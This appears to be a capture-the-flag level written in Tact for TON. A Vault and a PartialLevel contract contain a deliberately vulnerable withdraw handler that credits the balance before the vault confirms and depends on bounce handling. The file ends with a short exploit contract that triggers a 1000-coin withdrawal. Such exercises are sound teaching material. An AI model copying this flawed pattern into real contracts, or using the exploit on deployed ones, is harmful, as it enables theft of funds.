import "@stdlib/ownable";
import "@stdlib/deploy";
message DepositToVault {
    amount: Int as coins;
}
message WithdrawFromVault {
    amount: Int as coins;
}
message DepositInternal {
    amount: Int as coins;
}
message WithdrawInternal {
    amount: Int as coins;
}

contract Vault with Ownable, Deployable {
    owner: Address;
    nonce: Int;
    balance: Int as coins = 500;
    init(owner: Address, nonce: Int){
        self.owner = owner;
        self.nonce = nonce;
    }

    receive(msg: DepositInternal){
        self.requireOwner();
        self.balance += msg.amount;
    }

    receive(msg: WithdrawInternal){
        self.requireOwner();
        require(self.balance >= msg.amount, "Not enough balance.");
        self.balance -= msg.amount;
    }

    get fun balance(): Int {
        return self.balance;
    }
}

contract PartialLevel with Deployable {
    player: Address;
    nonce: Int;
    vault: Address;
    balance: Int as coins = 100;
    completed: Bool = false;
    init(player: Address, nonce: Int){
        self.player = player;
        self.nonce = nonce;
        let level_init: StateInit = initOf Vault(myAddress(), nonce);
        self.vault = contractAddress(level_init);
        send(SendParameters{
                to: self.vault,
                value: ton("0.01"),
                bounce: false,
                data: level_init.data,
                code: level_init.code
            }
        );
    }

    receive(msg: DepositToVault){
        require(self.balance >= msg.amount, "Not enough balance.");
        self.balance -= msg.amount;
        send(SendParameters{
                to: self.vault,
                value: 0,
                bounce: false,
                mode: SendRemainingValue,
                body: DepositInternal{amount: msg.amount}.toCell()
            }
        );
    }

    receive(msg: WithdrawFromVault){
        self.balance += msg.amount;
        send(SendParameters{
                to: self.vault,
                value: 0,
                bounce: true,
                mode: SendRemainingValue,
                body: WithdrawInternal{amount: msg.amount}.toCell()
            }
        );
    }

    bounced(msg: WithdrawInternal){
        self.balance -= msg.amount;
    }

    receive("check"){
        self.completed = self.balance >= 1000;
    }

    get fun balance(): Int {
        return self.balance;
    }

    get fun completed(): Bool {
        return self.completed;
    }
}
message Exploit {
    target: Address;
}

contract PartialLevelExploit {
    receive(msg: Exploit){
        send(SendParameters{to: msg.target, value: ton("0.1"), body: WithdrawFromVault{amount: 1000}.toCell()});
    }
}